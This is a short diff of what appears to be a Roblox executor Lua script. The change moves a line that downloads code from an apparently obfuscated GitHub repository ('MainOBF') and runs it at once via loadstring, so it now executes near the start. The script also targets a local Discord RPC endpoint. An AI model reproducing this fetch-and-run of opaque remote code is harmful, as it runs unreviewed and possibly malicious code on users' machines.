@@ -16,6 +16,7 @@ local HttpService = game:GetService("HttpService")
 local DiscordAPI = "http://127.0.0.1:6463/rpc?v=1"
 local RequestFunction
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kyuoso/MainOBF/main/1.lua"))()
 
 local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
 local Notify = AkaliNotif.Notify;
@@ -27,6 +28,3 @@ Notify({
 	Title = "Message";
 	Duration = 5;
 });
-
-wait()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/kyuoso/MainOBF/main/1.lua"))()
